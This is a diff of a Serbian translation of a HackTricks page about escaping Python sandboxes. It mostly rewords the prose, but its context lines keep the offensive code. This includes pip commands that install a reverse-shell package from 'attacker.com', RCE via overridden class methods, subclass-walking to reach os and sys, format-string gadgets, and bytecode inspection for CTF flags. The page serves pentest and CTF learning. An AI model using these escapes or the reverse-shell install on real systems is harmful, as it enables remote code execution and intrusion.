@@ -17,9 +17,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Get a hacker's perspective on your web apps, network, and cloud
+**Dobijte perspektivu hakera o vašim veb aplikacijama, mreži i oblaku**
 
-**Pronađite i prijavite kritične, iskorišćive ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napada, pronalaženje bezbednosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatizovane eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš trud u uverljive izveštaje.
+**Pronađite i prijavite kritične, eksploatabilne ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napadačke površine, pronalaženje bezbednosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatizovane eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš trud u uverljive izveštaje.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -27,7 +27,7 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 Ovo su neki trikovi za zaobilaženje zaštita python sandboksa i izvršavanje proizvoljnih komandi.
 
-## Command Execution Libraries
+## Biblioteke za izvršavanje komandi
 
 Prva stvar koju treba da znate je da li možete direktno izvršiti kod sa nekom već uvezenom bibliotekom, ili ako možete uvesti neku od ovih biblioteka:
 ```python
@@ -102,7 +102,7 @@ Ako imate pristup `pip` ili `pip.main()`, možete instalirati proizvoljan paket 
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Možete preuzeti paket za kreiranje reverzne ljuske ovde. Molimo vas da pre korišćenja **dekompresujete, promenite `setup.py` i stavite svoju IP adresu za reverznu ljusku**:
+Možete preuzeti paket za kreiranje reverzne ljuske ovde. Molimo vas da napomenete da pre korišćenja treba **dekompresovati, promeniti `setup.py` i staviti vašu IP adresu za reverznu ljusku**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
@@ -113,7 +113,7 @@ Ovaj paket se zove `Reverse`. Međutim, posebno je napravljen tako da kada napus
 ## Eval-ovanje python koda
 
 {% hint style="warning" %}
-Imajte na umu da exec omogućava višelinijske stringove i ";", ali eval ne (proverite operator vidre)
+Napomena da exec omogućava višelinijske stringove i ";", ali eval ne (proverite operator vidre)
 {% endhint %}
 
 Ako su određeni karakteri zabranjeni, možete koristiti **hex/octal/B64** reprezentaciju da **zaobiđete** ograničenje:
@@ -207,7 +207,7 @@ Ako možete **deklarisati klasu** i **napraviti objekat** te klase, mogli biste 
 
 #### RCE sa prilagođenim klasama
 
-Možete modifikovati neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) da ih **izvršavaju proizvoljan kod** kada su **pokrenute** bez direktnog pozivanja.
+Možete modifikovati neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) da izvršavaju **arbitrarni kod** kada su **pokrenute** bez direktnog pozivanja.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -342,7 +342,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 Kada nemate `__builtins__`, nećete moći da uvezete ništa niti čak da čitate ili pišete fajlove jer **sve globalne funkcije** (kao što su `open`, `import`, `print`...) **nisu učitane**.\
 Međutim, **po defaultu, python učitava mnogo modula u memoriju**. Ovi moduli mogu delovati benigno, ali neki od njih **takođe uvoze opasne** funkcionalnosti unutar sebe koje se mogu iskoristiti za dobijanje čak i **arbitrary code execution**.
 
-U sledećim primerima možete posmatrati kako da **zloupotrebite** neke od ovih "**benignih**" modula učitanih da **pristupite** **opasnim** **funkcionalnostima** unutar njih.
+U sledećim primerima možete posmatrati kako da **abuzujete** neke od ovih "**benignih**" modula učitanih da **pristupite** **opasnim** **funkcionalnostima** unutar njih.
 
 **Python2**
 ```python
@@ -430,7 +430,7 @@ class_obj.__init__.__globals__
 
 ## Otkrijte proizvoljnu izvršavanje
 
-Ovde želim da objasnim kako lako otkriti **opasnije funkcionalnosti koje su učitane** i predložiti pouzdanije eksploate.
+Ovde želim da objasnim kako lako otkriti **opasnije funkcionalnosti koje su učitane** i predložim pouzdanije eksploate.
 
 #### Pristupanje podklasama sa zaobilaženjima
 
@@ -464,7 +464,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Pronalazak opasnih učitanih biblioteka
 
-Na primer, znajući da sa bibliotekom **`sys`** može da se **uvezu proizvoljne biblioteke**, možete pretražiti sve **module koji su učitani i koji imaju uvezen sys unutar njih**:
+Na primer, znajući da sa bibliotekom **`sys`** može da se **uvezu proizvoljne biblioteke**, možete pretraživati sve **učitane module koji imaju uvezen sys unutar njih**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -731,7 +731,7 @@ return 'HAL 9000'
 **Više primera** o **format** **string** primerima može se naći na [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Proverite i sledeću stranicu za gadgete koji će r**ešavati osetljive informacije iz Python internih objekata**:
+Proverite i sledeću stranicu za gadgete koji će r**ešiti osetljive informacije iz Python internih objekata**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -762,7 +762,7 @@ Kao podsetnik, svaki put kada se izvrši neka akcija u pythonu, neka funkcija se
 
 Imate više ovakvih u sekciji [**Python izvršenje bez poziva**](./#python-execution-without-calls).
 
-Ranjivost format string u pythonu ne dozvoljava izvršavanje funkcije (ne dozvoljava korišćenje zagrada), tako da nije moguće dobiti RCE kao `'{0.system("/bin/sh")}'.format(os)`.\
+Ranjivost format string u pythonu ne omogućava izvršavanje funkcije (ne dozvoljava korišćenje zagrada), tako da nije moguće dobiti RCE kao `'{0.system("/bin/sh")}'.format(os)`.\
 Međutim, moguće je koristiti `[]`. Stoga, ako neka uobičajena python biblioteka ima **`__getitem__`** ili **`__getattr__`** metodu koja izvršava proizvoljan kod, moguće je zloupotrebiti ih da se dobije RCE.
 
 Tražeći takav gadget u pythonu, izveštaj predlaže ovu [**Github pretragu**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Gde je pronašao ovu [jednu](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
@@ -787,7 +787,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Ovaj uređaj omogućava **učitavanje biblioteke sa diska**. Stoga, potrebno je na neki način **napisati ili otpremiti biblioteku za učitavanje** ispravno kompajlirane na napadnuti server.
+Ovaj uređaj omogućava **učitavanje biblioteke sa diska**. Stoga, potrebno je na neki način **napisati ili otpremiti biblioteku za učitavanje** ispravno kompajliranu na napadnuti server.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -799,7 +799,7 @@ Izazov zapravo koristi drugu ranjivost na serveru koja omogućava kreiranje proi
 Ako želite da **naučite** o **python bytecode** detaljno, pročitajte ovaj **sjajan** post o toj temi: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-U nekim CTF-ovima možete dobiti ime **prilagođene funkcije u kojoj se nalazi flag** i potrebno je da pogledate **unutrašnjost** **funkcije** da biste ga izvukli.
+U nekim CTF-ovima možete dobiti ime **prilagođene funkcije u kojoj se nalazi flag** i morate da pogledate **unutrašnjost** **funkcije** da biste ga izvukli.
 
 Ovo je funkcija koju treba ispitati:
 ```python
@@ -834,7 +834,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Pristupanje kodu funkcije**
 
-**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da **dobijete objekat koda** funkcije.
+**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da **dobijete kod objekta** funkcije.
 ```python
 # In our current example
 get_flag.__code__
@@ -922,7 +922,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Napomena da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj varijabli koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje pomeraj varijable koja se učitava.
+Napomena da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj promenljivih koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje offset promenljive koja se učitava.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -962,7 +962,7 @@ return "Nope"
 ```
 ### Creating the code object
 
-Prvo, moramo znati **kako da kreiramo i izvršimo objekat koda** kako bismo mogli da kreiramo jedan za izvršavanje naše funkcije leak:
+Prvo, moramo znati **kako da kreiramo i izvršimo kod objekat** kako bismo mogli da kreiramo jedan za izvršavanje naše funkcije leak:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -1060,7 +1060,7 @@ Korišćenjem alata kao što je [**https://www.decompiler.com/**](https://www.de
 ### Assert
 
 Python koji se izvršava sa optimizacijama sa parametrom `-O` će ukloniti assert izjave i bilo koji kod uslovljen vrednošću **debug**.\
-Stoga, provere kao što su
+Stoga, provere kao
 ```python
 def check_permission(super_user):
 try:
@@ -1082,9 +1082,9 @@ will be bypassed
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Dobijte perspektivu hakera o vašim veb aplikacijama, mreži i oblaku
+**Dobijte perspektivu hakera o vašim web aplikacijama, mreži i oblaku**
 
-**Pronađite i prijavite kritične, eksploatabilne ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napadačke površine, pronalaženje bezbednosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatizovane eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš trud u uverljive izveštaje.
+**Pronađite i prijavite kritične, eksploatabilne ranjivosti sa stvarnim poslovnim uticajem.** Koristite naših 20+ prilagođenih alata za mapiranje napadačke površine, pronalaženje sigurnosnih problema koji vam omogućavaju da eskalirate privilegije, i koristite automatizovane eksploate za prikupljanje suštinskih dokaza, pretvarajući vaš trud u uverljive izveštaje.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
